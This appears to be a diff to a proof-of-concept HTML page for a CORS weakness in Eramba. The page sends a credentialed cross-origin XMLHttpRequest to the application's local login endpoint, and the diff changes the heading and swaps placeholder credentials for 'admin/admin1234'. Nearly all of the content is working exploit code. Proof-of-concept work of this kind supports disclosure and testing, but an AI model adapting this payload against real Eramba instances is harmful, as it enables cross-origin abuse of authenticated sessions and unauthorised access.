@@ -4,7 +4,7 @@
   <title>Eramba local CORS PoC (XHR Style)</title>
 </head>
 <body>
-  <h2>Eramba CORS Exploit Demo (XHR)</h2>
+  <h2>Eramba local CORS Exploit Demo (XHR)</h2>
   <button onclick="exploit()">Exploit via XMLHttpRequest</button>
 
   <script>
@@ -23,7 +23,7 @@
       req.open("POST", "https://localhost:8443/system-api/login", true);
       req.withCredentials = true;
       req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      req.send("login=asdf&password=asdf");
+      req.send("login=admin&password=admin1234");
     }
   </script>
 </body>
